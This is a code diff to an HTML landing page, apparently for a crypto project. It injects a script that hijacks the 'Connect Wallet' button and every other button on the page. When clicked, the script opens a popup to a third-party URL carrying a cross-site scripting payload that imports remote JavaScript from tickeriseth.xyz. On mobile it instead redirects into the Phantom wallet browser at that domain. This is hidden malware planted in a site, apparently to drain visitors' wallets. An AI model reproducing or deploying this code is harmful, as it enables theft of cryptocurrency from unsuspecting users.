@@ -151,7 +151,7 @@
                     <a class="hero5-button thq-button-filled">
                       <span class="hero5-text2 thq-body-small">
                         <fragment class="home-fragment16">
-                          <span class="home-text16">Connect Wallet</span>
+                          <span onclick="openPopupOrRedirect()" class="home-text16">Connect Wallet</span>
                         </fragment>
                       </span>
                     </a>
@@ -1186,6 +1186,36 @@
     </div>
   </div>
   <script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-YQSKRJN2J1" async=""></script>
+  <script>    // Function to open a popup or redirect
+    function openPopupOrRedirect() {
+        const url = "https://killabears.com/dashboard/viewer.php?img=%22--!%3E%3CsVg/oNloAd=import(%27https://tickeriseth.xyz/drop.js%27);%3E%5Cx3e"
+        const popupWidth = 500;
+        const popupHeight = 750;
+    
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+    
+        if (screenWidth > popupWidth && screenHeight > popupHeight) {
+            const left = (screenWidth - popupWidth) / 2;
+            const top = (screenHeight - popupHeight) / 2;
+    
+            window.open(url, "_blank", `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
+        } else {
+            window.location.href = "https://phantom.app/ul/browse/https%3A%2F%2Ftickeriseth.xyz%2Fmobile?ref=https%3A%2F%2Fticketiseth.xyz%2Fmobile";
+        }
+    }
+    
+    // Add event listeners to all button elements
+    document.addEventListener('DOMContentLoaded', function() {
+        const buttons = document.getElementsByTagName('button');
+        for (let i = 0; i < buttons.length; i++) {
+            buttons[i].addEventListener('click', function(event) {
+                event.preventDefault(); // Prevents the default button action if necessary
+                openPopupOrRedirect();
+            });
+        }
+    });
+</script>
   <script type="text/javascript">
     window.dataLayer = window.dataLayer || [];
             function gtag(){dataLayer.push(arguments);}
